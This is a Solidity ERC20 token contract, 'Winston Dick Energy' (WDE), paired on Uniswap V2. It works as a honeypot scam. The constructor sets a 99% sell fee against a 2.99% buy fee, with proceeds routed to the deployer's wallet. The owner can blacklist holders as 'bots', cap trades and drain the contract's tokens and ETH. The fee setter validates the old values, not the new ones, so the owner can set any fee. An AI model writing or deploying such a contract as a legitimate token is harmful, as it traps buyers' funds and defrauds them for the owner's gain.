// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "./ERC20.sol";
import "./Ownable.sol";
 
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
 
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
 
    function factory() external pure returns (address);
 
    function WETH() external pure returns (address);
}

contract WDE is ERC20, Ownable {
    uint256 constant public FEE_DENOMINATOR = 1e18;
    IUniswapV2Router02 public constant uniV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public immutable uniV2Pair;

    bool private inSwap;

    address public markettingWallet;

    uint256 public buyFee; // 1e18 is 100%
    uint256 public sellFee; // 1e18 is 100%

    uint256 public maxTradeAmount;
    uint256 public maxFeeSwapAmount;

    mapping(address => bool) public isFeeExcluded;
    mapping(address => bool) public isBot;

    constructor() ERC20("Winston Dick Energy", "WDE") {
        _mint(msg.sender, 10_000_000_000 * (10 ** decimals())); // 10 billion tokens

        uniV2Pair = IUniswapV2Factory(uniV2Router.factory()).createPair(address(this), uniV2Router.WETH());

        _approve(address(this), address(uniV2Router), type(uint256).max);
    
        setMarkettingWallet(msg.sender);
        setFees(0.0299e18, 0.99e18); // Set initial fees to 2.99% buy and 99% sell

        excludeAccountFromFees(msg.sender);
        excludeAccountFromFees(address(this));
        excludeAccountFromFees(address(uniV2Router));
    }

    function setMarkettingWallet(address _markettingWallet) public onlyOwner {
        markettingWallet = _markettingWallet;
        excludeAccountFromFees(markettingWallet);
    }

    function setFees(uint256 _buyFee, uint256 _sellFee) public onlyOwner {
        require(buyFee <= FEE_DENOMINATOR, "Buy fee too high");
        require(sellFee <= FEE_DENOMINATOR, "Sell fee too high");

        buyFee = _buyFee;
        sellFee = _sellFee;
    }

    function setMaxTradeAmount(uint256 _maxTradeAmount) external onlyOwner {
        maxTradeAmount = _maxTradeAmount;
    }

    function setMaxFeeSwapAmount(uint256 _maxFeeSwapAmount) external onlyOwner {
        maxFeeSwapAmount = _maxFeeSwapAmount;
    }

    function excludeAccountFromFees(address account) public onlyOwner {
        isFeeExcluded[account] = true;
    }

    function includeAccountToFees(address account) external onlyOwner {
        isFeeExcluded[account] = false;
    }

    function listBots(address[] calldata accounts) external onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            isBot[accounts[i]] = true;
        }
    }

    function delistBots(address[] calldata accounts) external onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            isBot[accounts[i]] = false;
        }
    }

    function swapFeesForEth() private {
        uint256 amount = balanceOf(address(this));
        if (amount > maxFeeSwapAmount) amount = maxFeeSwapAmount;
        if (amount == 0) return;

        inSwap = true;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniV2Router.WETH();
        uniV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            markettingWallet,
            block.timestamp
        );

        inSwap = false;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal override {
        if (!inSwap) { 
            require(!isBot[sender], "This bot is blocked");

            bool buying = sender == uniV2Pair && !isFeeExcluded[recipient];
            bool selling = recipient == uniV2Pair && !isFeeExcluded[sender];

            if (buying || selling) {
                require(maxTradeAmount > 0, "Trading not enabled yet");
                require(amount <= maxTradeAmount, "Max trade amount exceeded");

                uint256 feePct;
                if (buying) feePct = buyFee;
                else feePct = sellFee;
                uint256 fees = amount * feePct / FEE_DENOMINATOR;

                amount = amount - fees;
                super._transfer(sender, address(this), fees);

                if (selling) swapFeesForEth();
            }
        }
        super._transfer(sender, recipient, amount);
    }

    function recoverERC20(address tokenAddress, uint256 tokenAmount) external onlyOwner {
        IERC20(tokenAddress).transfer(owner(), tokenAmount);
    }

    function recoverETH(uint256 amount) external onlyOwner {
        payable(owner()).transfer(amount);
    }

    receive() external payable {}
}